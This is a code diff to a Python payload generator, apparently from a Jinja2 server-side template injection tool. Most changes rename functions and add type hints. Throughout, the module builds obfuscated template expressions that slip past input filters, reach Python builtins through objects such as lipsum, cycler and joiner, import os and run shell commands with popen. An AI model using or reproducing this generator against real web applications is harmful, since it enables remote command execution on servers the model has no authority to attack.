@@ -4,22 +4,99 @@
 import re
 import time
 import logging
+import sys
 
 from collections import defaultdict
-from typing import Callable, DefaultDict, List, Dict, Union, Any, Tuple
+from typing import (
+    Callable,
+    DefaultDict,
+    List,
+    Dict,
+    TypeVar,
+    Union,
+    Any,
+    Tuple,
+)
 
 from .colorize import colored
 from .const import *
 
 ContextVariable = Dict[str, Any]
-ReqGenRequirement = Tuple
 
-ReqGenRequirements = List[ReqGenRequirement]
-ReqGenReturn = ReqGenRequirements
-ReqGen = Callable[..., ReqGenReturn]
-ReqGenResult = Tuple[str, ContextVariable]
+if sys.version_info >= (3, 8):
+    from typing import Literal
+    LiteralTarget = Tuple[Literal["literal"], str]
+    UnsatisfiedTarget = Tuple[Literal["unsatisfied"],]
+    OneofTarget = Tuple[Literal["oneof"], List["Target"]]
+    WithContextVarTarget = Tuple[Literal["with_context_var"], str]
+    ZeroTarget = Tuple[Literal["zero"],]
+    PositiveIntegerTarget = Tuple[Literal["positive_integer"], int]
+    IntegerTarget = Tuple[Literal["integer"], int]
+    StringConcatTarget = Tuple[Literal["string_string_concat"],]
+    StringPercentTarget = Tuple[Literal["string_percent"],]
+    StringPercentLowerCTarget = Tuple[Literal["string_percent_lower_c"],]
+    StringUnderlineTarget = Tuple[Literal["string_underline"],]
+    StringLowerCTarget = Tuple[Literal["string_lower_c"],]
+    StringManyPercentLowerCTarget = Tuple[Literal["string_many_percent_lower_c"], int]
+    StringManyFormatCTarget = Tuple[Literal["string_many_format_c"], int]
+    CharTarget = Tuple[Literal["char"], str]
+    StringTarget = Tuple[Literal["string"], str]
+    FormularSumTarget = Tuple[Literal["formular_sum"], List[int]]
+    AttributeTarget = Tuple[Literal["attribute"], "Target", str]
+    ItemTarget = Tuple[Literal["item"], "Target", str]
+    ChassAttributeTarget = Tuple[Literal["class_attribute"], "Target", str]
+    ChainedAttriuteItemTarget = Tuple[Literal["chained_attribute_item"], ...]
+    ImportFuncTarget = Tuple[Literal["import_func"],]
+    EvalFuncTarget = Tuple[Literal["eval_func"],]
+    EvalTarget = Tuple[Literal["eval"], str]
+    ConfigTarget = Tuple[Literal["config"],]
+    ModuleOSTarget = Tuple[Literal["module_os"],]
+    OSPopenObj = Tuple[Literal["os_popen_obj"],]
+    OSPopenRead = Tuple[Literal["os_popen_read"],]
+    # Target = LiteralTarget
+    Target = Union[
+        LiteralTarget,
+        UnsatisfiedTarget,
+        OneofTarget,
+        WithContextVarTarget,
+        ZeroTarget,
+        PositiveIntegerTarget,
+        IntegerTarget,
+        StringConcatTarget,
+        StringPercentTarget,
+        StringPercentLowerCTarget,
+        StringUnderlineTarget,
+        StringLowerCTarget,
+        StringManyPercentLowerCTarget,
+        StringManyFormatCTarget,
+        CharTarget,
+        StringTarget,
+        FormularSumTarget,
+        AttributeTarget,
+        ItemTarget,
+        ChassAttributeTarget,
+        ChainedAttriuteItemTarget,
+        ImportFuncTarget,
+        EvalFuncTarget,
+        EvalTarget,
+        ConfigTarget,
+        ModuleOSTarget,
+        OSPopenObj,
+        OSPopenRead,
+    ]
+else:
+    LiteralTarget = Tuple
+    UnsatisfiedTarget = Tuple
+    OneofTarget = Tuple
+    WithContextVarTarget = Tuple
+    Target = Tuple
 
-req_gens: DefaultDict[str, List[ReqGen]] = defaultdict(list)
+
+ExpressionGeneratorReturn = TypeVar("ExpressionGeneratorReturn", bound=List[Target])
+ExpressionGenerator = Callable[..., ExpressionGeneratorReturn]
+PayloadGeneratorResult = Tuple[str, ContextVariable]
+
+expression_gens: DefaultDict[str, List[ExpressionGenerator]] = defaultdict(list)
 logger = logging.getLogger("payload_gen")
 
 gen_weight_default = {
@@ -34,11 +111,11 @@ gen_weight_default = {
 }
 
 
-def req_gen(f: ReqGen):
+def expression_gen(f: ExpressionGenerator):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(f"Error found when register payload generator {f.__name__}")
-    req_gens[gen_type.group(1)].append(f)
+    expression_gens[gen_type.group(1)].append(f)
 
 
 def hashable(o):
@@ -62,26 +139,26 @@ class PayloadGenerator:
         self.cache = {}
         self.generate_funcs: List[
             Tuple[
-                Callable[[ReqGenRequirement], bool],
-                Callable[[ReqGenRequirement], Union[ReqGenResult, None]],
+                Callable[[Target], bool],
+                Callable[[Target], Union[PayloadGeneratorResult, None]],
             ]
         ]
-        self.generate_funcs = [
+        self.generate_funcs = [  # type: ignore
             (
-                (lambda gen_req: gen_req[0] == LITERAL),
-                (lambda gen_req: (gen_req[1], {})),
+                (lambda target: target[0] == LITERAL),
+                self.literal_generate,
             ),
-            ((lambda gen_req: gen_req[0] == UNSATISFIED), (lambda gen_req: None)),
-            ((lambda gen_req: gen_req[0] == ONEOF), self.oneof_generate),
+            ((lambda target: target[0] == UNSATISFIED), self.unsatisfied_generate),
+            ((lambda target: target[0] == ONEOF), self.oneof_generate),
             (
-                (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
-                (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]})),
+                (lambda target: target[0] == WITH_CONTEXT_VAR),
+                self.with_context_var_generate,
             ),
             (
-                (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
-                (lambda gen_req: self.cache[gen_req]),
+                (lambda target: hashable(target) and target in self.cache),
+                (lambda target: self.cache[target]),
             ),
-            ((lambda gen_req: True), self.common_generate),
+            ((lambda target: True), self.common_generate),
         ]
         self.used_count = defaultdict(int)
         self.detect_mode = detect_mode
@@ -92,19 +169,17 @@ class PayloadGenerator:
         self.callback = callback if callback else (lambda x, y: None)
 
     def generate_by_list(
-        self, req_list: List[ReqGenRequirement]
-    ) -> Union[ReqGenResult, None]:
+        self, targets: List[Target]
+    ) -> Union[PayloadGeneratorResult, None]:
         str_result, used_context = "", {}
-        for req in req_list:
+        for target in targets:
             for checker, runner in self.generate_funcs:
-                if not checker(req):
+                if not checker(target):
                     continue
-                result = runner(req)
+                result = runner(target)
                 if result is None:
                     return None
                 s, c = result
-                # if not self.waf_func(s):
-                # return None
                 str_result += s
                 used_context.update(c)
                 break
@@ -114,26 +189,36 @@ class PayloadGenerator:
             return None
         return str_result, used_context
 
-    def oneof_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
-        _, *reqs = gen_req
-        for req in reqs:
+    def literal_generate(self, target: LiteralTarget) -> PayloadGeneratorResult:
+        return (target[1], {})
+
+    def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
+        return None
+
+    def oneof_generate(
+        self, target: OneofTarget
+    ) -> Union[PayloadGeneratorResult, None]:
+        _, *alternative_targets = target
+        for req in alternative_targets:
             ret = self.generate_by_list(req)
             if ret is not None:
                 return ret
         return None
 
-    def common_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
-        gen_type: str
+    def with_context_var_generate(self, target: WithContextVarTarget):
+        return ("", {target[1]: self.context[target[1]]})
+
+    def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
         gen_type, *args = gen_req
-        if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
+        if gen_type not in expression_gens or len(expression_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
-        gens = req_gens[gen_type].copy()
+        gens = expression_gens[gen_type].copy()
         if self.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
-            gen_ret: ReqGenReturn = gen(self.context, *args)
+            gen_ret: List[Target] = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
                 if hashable(gen_req):
@@ -201,7 +286,9 @@ class PayloadGenerator:
         s, c = result
         return s
 
-    def generate_with_used_context(self, gen_type, *args) -> Union[ReqGenResult, None]:
+    def generate_with_used_context(
+        self, gen_type, *args
+    ) -> Union[PayloadGeneratorResult, None]:
         result = self.generate_by_list([(gen_type, *args)])
         if result is None:
             return None
@@ -219,12 +306,12 @@ def generate(
 # ---
 
 
-@req_gen
-def gen_string_string_concat_plus(context: dict):
+@expression_gen
+def gen_string_string_concat_plus(context: dict) -> List[LiteralTarget]:
     return [(LITERAL, "+")]
 
 
-@req_gen
+@expression_gen
 def gen_string_string_concat_wave(context: dict):
     return [(LITERAL, "~")]
 
@@ -232,12 +319,12 @@ def gen_string_string_concat_wave(context: dict):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_add(context, num_list):
     return [(LITERAL, "({})".format("+".join(str(n) for n in num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_addfunc(context, num_list):
     num_list = [
         str(n) if i == 0 else ".__add__({})".format(n) for i, n in enumerate(num_list)
@@ -245,7 +332,7 @@ def gen_formular_sum_addfunc(context, num_list):
     return [(LITERAL, "({})".format("".join(num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_attraddfund(context, num_list):
     num_list = [
         str(n) if i == 0 else f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
@@ -254,7 +341,7 @@ def gen_formular_sum_attraddfund(context, num_list):
     return [(LITERAL, "({})".format("".join(num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_tuplesum(context, num_list):
     if len(num_list) == 1:
         return [(LITERAL, str(num_list[0]))]
@@ -265,22 +352,22 @@ def gen_formular_sum_tuplesum(context, num_list):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_zero_literal(context: dict):
     return [(LITERAL, "0")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_2(context: dict):
     return [(LITERAL, "({}|int)")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_3(context: dict):
     return [(LITERAL, "(g|urlencode|length)")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_4(context: dict):
     return [(LITERAL, "({}|urlencode|count)")]
 
@@ -288,21 +375,21 @@ def gen_zero_4(context: dict):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_simple(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
     return [(LITERAL, str(value))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_hex(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
     return [(LITERAL, hex(value))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_sum(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
@@ -332,7 +419,7 @@ def gen_positive_integer_sum(context: dict, value: int):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_recurdivided(context: dict, value: int):
     if value <= 6:
         return [(UNSATISFIED,)]
@@ -351,7 +438,7 @@ def gen_positive_integer_recurdivided(context: dict, value: int):
     )
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_recurmulitiply(context: dict, value: int):
     xs = [x for x in range(3, value // 2) if value % x == 0]
     if xs == []:
@@ -373,27 +460,27 @@ def gen_positive_integer_recurmulitiply(context: dict, value: int):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_dictlength(context: dict, value: int):
     return [(LITERAL, "(dict({}=x)|join|length)".format("x" * value))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_length(context: dict, value: int):
     return [(LITERAL, "(({},)|length)".format(",".join("x" * value)))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_length2(context: dict, value: int):
     return [(LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_truesum1(context: dict, value: int):
     return [(LITERAL, "({})".format("+".join(["True"] * value)))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_truesum2(context: dict, value: int):
     return [(LITERAL, "(({},)|sum)".format(",".join(["True"] * value)))]
 
@@ -401,12 +488,12 @@ def gen_positive_integer_truesum2(context: dict, value: int):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_integer_literal(context: dict, value: int):
     return [(LITERAL, str(value))]
 
 
-@req_gen
+@expression_gen
 def gen_integer_context(context: dict, value: int):
     if value not in context.values():
         return [(UNSATISFIED,)]
@@ -417,21 +504,21 @@ def gen_integer_context(context: dict, value: int):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_integer_zero(context: dict, value: int):
     if value != 0:
         return [(UNSATISFIED,)]
     return [(ZERO,)]
 
 
-@req_gen
+@expression_gen
 def gen_integer_positive(context: dict, value: int):
     if value <= 0:
         return [(UNSATISFIED,)]
     return [(POSITIVE_INTEGER, value)]
 
 
-@req_gen
+@expression_gen
 def gen_integer_negative(context: dict, value: int):
     if value >= 0:
         return [(UNSATISFIED,)]
@@ -446,7 +533,7 @@ def gen_integer_negative(context: dict, value: int):
 #     ]
 
 
-@req_gen
+@expression_gen
 def gen_integer_subtract(context: dict, value: int):
     ints = [
         (var_name, var_value)
@@ -497,17 +584,17 @@ def gen_integer_subtract(context: dict, value: int):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_literal1(context):
     return [(LITERAL, "'%'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_literal2(context):
     return [(LITERAL, '"%"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_context(context):
     if "%" not in context.values():
         return [(UNSATISFIED,)]
@@ -515,17 +602,17 @@ def gen_string_percent_context(context):
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencode1(context):
     return [(LITERAL, "(lipsum()|urlencode|first)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencode2(context):
     return [(LITERAL, "({}|escape|urlencode|first)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lipsum(context):
     return [
         (
@@ -538,12 +625,12 @@ def gen_string_percent_lipsum(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lipsum2(context):
     return [(LITERAL, "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_namespace(context):
     return [
         (
@@ -555,7 +642,7 @@ def gen_string_percent_namespace(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lipsumcomplex(context):
     return [
         (LITERAL, "(lipsum[(lipsum|escape|batch("),
@@ -580,7 +667,7 @@ def gen_string_percent_lipsumcomplex(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencodelong(context):
     return [
         (
@@ -601,27 +688,27 @@ def gen_string_percent_urlencodelong(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_literal1(context):
     return [(LITERAL, "'c'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_literal2(context):
     return [(LITERAL, '"c"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_joindict(context):
     return [(LITERAL, "(dict(c=x)|join)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_lipsumurlencode(context):
     return [(LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_lipsumbatch(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
@@ -630,7 +717,7 @@ def gen_string_lower_c_lipsumbatch(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_joinerbatch(context):
     return [
         (LITERAL, "(joiner|string|batch("),
@@ -642,17 +729,17 @@ def gen_string_lower_c_joinerbatch(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_literal1(context):
     return [(LITERAL, "'%c'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_literal2(context):
     return [(LITERAL, '"%c"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_concat(context):
     return [
         (LITERAL, "("),
@@ -663,7 +750,7 @@ def gen_string_percent_lower_c_concat(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_dictjoin(context):
     # "(dict([('%',x),('c',x)])|join)"
     return [
@@ -675,7 +762,7 @@ def gen_string_percent_lower_c_dictjoin(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_listjoin(context):
     # "(['%','c']|join)"
     return [
@@ -687,7 +774,7 @@ def gen_string_percent_lower_c_listjoin(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_tuplejoin(context):
     # "(('%','c')|join)"
     return [
@@ -699,7 +786,7 @@ def gen_string_percent_lower_c_tuplejoin(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_cycler(context):
     # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
     return [
@@ -714,12 +801,12 @@ def gen_string_percent_lower_c_cycler(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_many_percent_lower_c_multiply(context, count: int):
     return [(STRING_PERCENT_LOWER_C,), (LITERAL, "*"), (INTEGER, count)]
 
 
-@req_gen
+@expression_gen
 def gen_string_many_percent_lower_c_concat(context, count: int):
     l = [
         [
@@ -738,17 +825,17 @@ def gen_string_many_percent_lower_c_concat(context, count: int):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_literal1(context):
     return [(LITERAL, "'_'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_literal2(context):
     return [(LITERAL, '"_"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_context(context: dict):
     if "_" in context.values():
         v = [k for k, v in context.items() if v == "_"][0]
@@ -756,7 +843,7 @@ def gen_string_underline_context(context: dict):
     return [(UNSATISFIED,)]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_lipsum(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
@@ -765,7 +852,7 @@ def gen_string_underline_lipsum(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_tupleselect(context):
     return [
         (LITERAL, "(()|select|string|batch("),
@@ -774,7 +861,7 @@ def gen_string_underline_tupleselect(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_many_format_c_complex(context, num):
     parts = "(({c})*{l})".format(
         c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,LOWERC)",
@@ -786,17 +873,17 @@ def gen_string_many_format_c_complex(context, num):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_char_literal1(context, c):
     return [(LITERAL, f"'{c}'" if c != "'" else "'\\''")]
 
 
-@req_gen
+@expression_gen
 def gen_char_literal2(context, c):
     return [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]
 
 
-@req_gen
+@expression_gen
 def gen_char_select(context, c):
     char_patterns = {
         "((dict|trim|list)[INDEX])": {
@@ -896,14 +983,14 @@ def gen_char_select(context, c):
     return [(UNSATISFIED,)]
 
 
-@req_gen
+@expression_gen
 def gen_char_dict(context, c):
     if not re.match("[A-Za-z]", c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
 
-@req_gen
+@expression_gen
 def gen_char_num(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
@@ -917,7 +1004,7 @@ def gen_char_num(context, c):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_char_num2(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
@@ -935,19 +1022,19 @@ def gen_char_num2(context, c):
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
 
-@req_gen
+@expression_gen
 def gen_string_1(context: dict, value: str):
     chars = [c if c != "'" else "\\'" for c in value]
     return [(LITERAL, "'{}'".format("".join(chars)))]
 
 
-@req_gen
+@expression_gen
 def gen_string_2(context: dict, value: str):
     chars = [c if c != '"' else '\\"' for c in value]
     return [(LITERAL, '"{}"'.format("".join(chars)))]
 
 
-@req_gen
+@expression_gen
 def gen_string_x1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
@@ -955,7 +1042,7 @@ def gen_string_x1(context: dict, value: str):
     return [(LITERAL, '"{}"'.format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_x2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
@@ -963,7 +1050,7 @@ def gen_string_x2(context: dict, value: str):
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_u1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
@@ -971,7 +1058,7 @@ def gen_string_u1(context: dict, value: str):
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_u2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
@@ -979,7 +1066,7 @@ def gen_string_u2(context: dict, value: str):
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [(UNSATISFIED,)]
@@ -987,7 +1074,7 @@ def gen_string_context(context: dict, value: str):
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
-@req_gen
+@expression_gen
 def gen_string_twostringconcat(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
         return [(UNSATISFIED,)]
@@ -1006,7 +1093,7 @@ def gen_string_twostringconcat(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_twostringconcat2(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
         return [(UNSATISFIED,)]
@@ -1025,7 +1112,7 @@ def gen_string_twostringconcat2(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_concat1(context: dict, value: str):
     return [
         (
@@ -1037,7 +1124,7 @@ def gen_string_concat1(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_concat2(context: dict, value: str):
     return [
         (
@@ -1049,7 +1136,7 @@ def gen_string_concat2(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_concat3(context: dict, value: str):
     return [
         (
@@ -1061,7 +1148,7 @@ def gen_string_concat3(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_chars(context: dict, value: str):
     ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
     for c in value[1:]:
@@ -1073,7 +1160,7 @@ def gen_string_chars(context: dict, value: str):
     return ans
 
 
-@req_gen
+@expression_gen
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
         return [(UNSATISFIED,)]
@@ -1090,14 +1177,14 @@ def gen_string_removedunder(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     return [(LITERAL, "(dict({}=x)|join)".format(value))]
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
@@ -1110,7 +1197,7 @@ def gen_string_splitdictjoin(context: dict, value: str):
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin2(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
@@ -1124,7 +1211,7 @@ def gen_string_splitdictjoin2(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin3(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
@@ -1137,7 +1224,7 @@ def gen_string_splitdictjoin3(context: dict, value: str):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_formatpercent(context: dict, value: str):
     # (('%c'*n)%(97,98,99))
     req = []
@@ -1152,7 +1239,7 @@ def gen_string_formatpercent(context: dict, value: str):
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc(context: dict, value: str):
     # (('%c'*n)|format(97,98,99))
     req = []
@@ -1167,7 +1254,7 @@ def gen_string_formatfunc(context: dict, value: str):
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc2(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
@@ -1189,7 +1276,7 @@ def gen_string_formatfunc2(context: dict, value: str):
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
@@ -1214,7 +1301,7 @@ def gen_string_formatfunc3(context: dict, value: str):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_attribute_normal1(context, obj_req, attr_name):
     if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", attr_name):
         return [(UNSATISFIED,)]
@@ -1225,7 +1312,7 @@ def gen_attribute_normal1(context, obj_req, attr_name):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_attribute_normal2(context, obj_req, attr_name):
     return [
         obj_req,
@@ -1235,7 +1322,7 @@ def gen_attribute_normal2(context, obj_req, attr_name):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_attribute_attrfilter(context, obj_req, attr_name):
     return [
         (LITERAL, "("),
@@ -1249,7 +1336,7 @@ def gen_attribute_attrfilter(context, obj_req, attr_name):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_item_normal1(context, obj_req, item_name):
     if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
         return [(UNSATISFIED,)]
@@ -1260,7 +1347,7 @@ def gen_item_normal1(context, obj_req, item_name):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_item_normal2(context, obj_req, item_name):
     return [
         obj_req,
@@ -1270,7 +1357,7 @@ def gen_item_normal2(context, obj_req, item_name):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_item_dunderfunc(context, obj_req, item_name):
     return [
         (ATTRIBUTE, obj_req, "__getitem__"),
@@ -1283,7 +1370,7 @@ def gen_item_dunderfunc(context, obj_req, item_name):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_class_attribute_literal(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
@@ -1296,7 +1383,7 @@ def gen_class_attribute_literal(context, obj_req, attr_name):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_class_attribute_attrfilter(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
@@ -1315,7 +1402,7 @@ def gen_class_attribute_attrfilter(context, obj_req, attr_name):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
     if not attr_item_req:
         return [
@@ -1340,7 +1427,7 @@ def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_import_func_g(context):
     return [
         (
@@ -1354,7 +1441,7 @@ def gen_import_func_g(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_lipsum(context):
     return [
         (
@@ -1367,7 +1454,7 @@ def gen_import_func_lipsum(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_joiner(context):
     return [
         (
@@ -1381,7 +1468,7 @@ def gen_import_func_joiner(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_namespace(context):
     return [
         (
@@ -1398,7 +1485,7 @@ def gen_import_func_namespace(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_g(context):
     return [
         (
@@ -1412,7 +1499,7 @@ def gen_eval_func_g(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_lipsum(context):
     return [
         (
@@ -1425,7 +1512,7 @@ def gen_eval_func_lipsum(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_joiner(context):
     return [
         (
@@ -1439,7 +1526,7 @@ def gen_eval_func_joiner(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_namespace(context):
     return [
         (
@@ -1456,7 +1543,7 @@ def gen_eval_func_namespace(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_eval_normal(context, eval_param):
     return [
         (LITERAL, "("),
@@ -1470,12 +1557,12 @@ def gen_eval_normal(context, eval_param):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_config_literal(context):
     return [(LITERAL, "config")]
 
 
-@req_gen
+@expression_gen
 def gen_config_self(context):
     return [
         (
@@ -1509,7 +1596,7 @@ def gen_config_self(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_module_os_import(context):
     return [
         (IMPORT_FUNC,),
@@ -1519,7 +1606,7 @@ def gen_module_os_import(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_module_os_eval(context):
     return [
         (EVAL, (STRING, "__import__")),
@@ -1529,7 +1616,7 @@ def gen_module_os_eval(context):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_module_os_config(context):
     return [
         (
@@ -1545,7 +1632,7 @@ def gen_module_os_config(context):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_obj_normal(context, cmd):
     return [
         (LITERAL, "("),
@@ -1556,7 +1643,7 @@ def gen_os_popen_obj_normal(context, cmd):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_obj_eval(context, cmd):
     cmd = cmd.replace("'", "\\'")
     return [(EVAL, (STRING, "__import__('os').popen('" + cmd + "')"))]
@@ -1565,7 +1652,7 @@ def gen_os_popen_obj_eval(context, cmd):
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_read_normal(context, cmd):
     return [
         (LITERAL, "("),
@@ -1574,7 +1661,7 @@ def gen_os_popen_read_normal(context, cmd):
     ]
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_read_normalspace(context, cmd):
     return [
         (LITERAL, "("),
@@ -1583,7 +1670,7 @@ def gen_os_popen_read_normalspace(context, cmd):
     ]
